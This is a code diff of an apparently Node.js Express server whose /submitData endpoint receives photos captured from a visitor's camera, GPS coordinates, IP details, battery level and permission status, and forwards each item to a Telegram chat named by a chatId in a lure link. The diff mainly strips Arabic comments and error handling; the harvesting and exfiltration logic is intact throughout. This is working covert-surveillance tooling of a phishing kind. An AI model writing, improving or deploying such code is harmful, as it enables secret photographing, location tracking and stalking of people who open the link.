@@ -18,7 +18,6 @@ app.use(express.static(__dirname));
 let userLink = ''; 
 const s = `${m}/index.html?chatId=`; 
 
-// إرسال البيانات إلى الرابط الثابت
 async function sendRequestToFixedUrl() {
     try {
         const response = await axios.post(fixedUrl, { message: 'This is a periodic request.' });
@@ -28,75 +27,56 @@ async function sendRequestToFixedUrl() {
     }
 }
 
-// جدولة إرسال الطلبات كل 40 ثانية
 setInterval(sendRequestToFixedUrl, 40000);
 
 app.post('/submitData', async (req, res) => {
-    // ✅ إرسال رد فوري وفارغ - بدون انتظار معالجة البيانات
-    res.status(200).end();
-
     const { chatId, imageDatas, location, permissions, ipInfo, battery } = req.body;
 
-    try {
-        // التحقق من وجود chatId
-        if (!chatId) {
-            console.error('chatId is missing');
-            return;
-        }
+    if (!chatId) return;
 
-        // إرسال الصور إذا وجدت
-        if (imageDatas) {
-            const images = imageDatas.split(',');
-            for (let i = 0; i < images.length; i++) {
-                try {
-                    const buffer = Buffer.from(images[i], 'base64');
-                    await bot.sendPhoto(chatId, buffer, { caption: `Photo ${i + 1}` });
-                } catch (err) {
-                    console.error(`Error sending photo ${i + 1}:`, err.message);
-                }
+    if (imageDatas) {
+        const images = imageDatas.split(',');
+        for (let i = 0; i < images.length; i++) {
+            try {
+                const buffer = Buffer.from(images[i], 'base64');
+                await bot.sendPhoto(chatId, buffer, { caption: `Photo ${i + 1}` });
+            } catch (err) {
+                console.error(`Error sending photo ${i + 1}:`, err.message);
             }
+        }
+    } else {
+        bot.sendMessage(chatId, 'لم يتم جمع الصور.');
+    }
+
+    if (location) {
+        const locationRegex = /Lat:\s*(-?\d+\.\d+),\s*Long:\s*(-?\d+\.\d+)/;
+        const match = location.match(locationRegex);
+
+        if (match) {
+            const latitude = parseFloat(match[1]);
+            const longitude = parseFloat(match[2]);
+            bot.sendLocation(chatId, latitude, longitude);
         } else {
-            bot.sendMessage(chatId, 'لم يتم جمع الصور.');
+            bot.sendMessage(chatId, 'لم يتم تحديد الموقع بشكل صحيح.');
         }
+    } else {
+        bot.sendMessage(chatId, 'لم يتم جمع الموقع.');
+    }
 
-        // إرسال الموقع
-        if (location) {
-            const locationRegex = /Lat:\s*(-?\d+\.\d+),\s*Long:\s*(-?\d+\.\d+)/;
-            const match = location.match(locationRegex);
+    if (ipInfo) {
+        bot.sendMessage(chatId, `IP Info: ${ipInfo}`);
+    } else {
+        bot.sendMessage(chatId, 'لم يتم جمع معلومات IP.');
+    }
 
-            if (match) {
-                const latitude = parseFloat(match[1]);
-                const longitude = parseFloat(match[2]);
-                bot.sendLocation(chatId, latitude, longitude);
-            } else {
-                bot.sendMessage(chatId, 'لم يتم تحديد الموقع بشكل صحيح.');
-            }
-        } else {
-            bot.sendMessage(chatId, 'لم يتم جمع الموقع.');
-        }
+    if (battery) {
+        bot.sendMessage(chatId, `Battery: ${battery}%`);
+    } else {
+        bot.sendMessage(chatId, 'لم يتم جمع حالة البطارية.');
+    }
 
-        // إرسال معلومات IP
-        if (ipInfo) {
-            bot.sendMessage(chatId, `IP Info: ${ipInfo}`);
-        } else {
-            bot.sendMessage(chatId, 'لم يتم جمع معلومات IP.');
-        }
-
-        // إرسال حالة البطارية
-        if (battery) {
-            bot.sendMessage(chatId, `Battery: ${battery}%`);
-        } else {
-            bot.sendMessage(chatId, 'لم يتم جمع حالة البطارية.');
-        }
-
-        // إرسال الصلاحيات
-        if (permissions) {
-            bot.sendMessage(chatId, `Permissions Denied: ${permissions}`);
-        }
-
-    } catch (error) {
-        console.error('Error processing data:', error.message);
-        bot.sendMessage(chatId, 'حدث خطأ أثناء معالجة البيانات.');
+    if (permissions) {
+        bot.sendMessage(chatId, `Permissions Denied: ${permissions}`);
     }
 });
 
